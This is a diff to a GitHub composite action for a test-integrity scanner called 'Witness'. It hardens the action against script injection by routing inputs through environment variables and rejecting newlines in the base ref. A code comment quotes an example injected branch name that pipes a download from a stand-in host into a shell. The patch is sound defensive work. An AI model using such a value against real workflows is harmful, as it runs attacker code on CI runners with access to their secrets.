@@ -51,13 +51,26 @@ outputs:
 runs:
   using: composite
   steps:
+    # Every value below reaches bash through env, never through ${{ }} inside the
+    # script. A ${{ }} expression is pasted in as source text before a shell
+    # exists, so `base` arriving as `x";curl evil|sh;"` would have executed —
+    # and a caller passing github.event.pull_request.head.ref is both an
+    # ordinary thing to write and attacker-controlled, because git allows ; $ `
+    # and quotes in a branch name.
     - name: Resolve base ref
       id: base
       shell: bash
+      env:
+        INPUT_BASE: ${{ inputs.base }}
       run: |
         set -euo pipefail
-        if [ -n "${{ inputs.base }}" ]; then
-          BASE="${{ inputs.base }}"
+        if [ -n "$INPUT_BASE" ]; then
+          # A newline would let a ref write extra key=value pairs into
+          # GITHUB_OUTPUT, which is the same trick one layer down.
+          case $INPUT_BASE in
+            *$'\n'*|*$'\r'*) echo "::error::witness: base ref must not contain newlines"; exit 1 ;;
+          esac
+          BASE="$INPUT_BASE"
         elif [ -n "${GITHUB_BASE_REF:-}" ]; then
           BASE="origin/${GITHUB_BASE_REF}"
         else
@@ -98,18 +111,24 @@ runs:
     - name: Job summary
       if: inputs.comment == 'true'
       shell: bash
+      env:
+        WITNESS_BASE: ${{ steps.base.outputs.ref }}
+        SCAN_STATUS: ${{ steps.scan.outputs.status }}
+        SCAN_ISSUES: ${{ steps.scan.outputs.issues }}
+        SCAN_FINDINGS: ${{ steps.scan.outputs.findings }}
+        SCAN_TELLS: ${{ steps.scan.outputs.tells }}
       run: |
         set -uo pipefail
         {
           echo "### Witness — test integrity scan"
           echo
-          if [ "${{ steps.scan.outputs.status }}" != "findings" ]; then
+          if [ "$SCAN_STATUS" != "findings" ]; then
             echo "No tells found in this diff."
           else
-            echo "**${{ steps.scan.outputs.issues }} issue(s) across ${{ steps.scan.outputs.findings }} site(s):** \`${{ steps.scan.outputs.tells }}\`"
+            echo "**${SCAN_ISSUES} issue(s) across ${SCAN_FINDINGS} site(s):** \`${SCAN_TELLS}\`"
             echo
             echo '```'
-            node "${GITHUB_ACTION_PATH}/bin/witness-scan.js" --base "${{ steps.base.outputs.ref }}" 2>/dev/null || true
+            node "${GITHUB_ACTION_PATH}/bin/witness-scan.js" --base "$WITNESS_BASE" 2>/dev/null || true
             echo '```'
             echo
             echo "Every one of these has a legitimate version. If it is the right call here, keep it and add a \`witness: <why>\` comment on or next to the line — that silences the finding and records the decision."
@@ -125,8 +144,11 @@ runs:
 
     - name: Apply gate
       shell: bash
+      env:
+        SCAN_EXIT: ${{ steps.scan.outputs.exit }}
+        INPUT_FAIL_ON: ${{ inputs.fail-on }}
       run: |
-        if [ "${{ steps.scan.outputs.exit }}" != "0" ]; then
-          echo "::error::witness: findings matched fail-on (${{ inputs.fail-on }})"
+        if [ "$SCAN_EXIT" != "0" ]; then
+          echo "::error::witness: findings matched fail-on (${INPUT_FAIL_ON})"
           exit 1
         fi
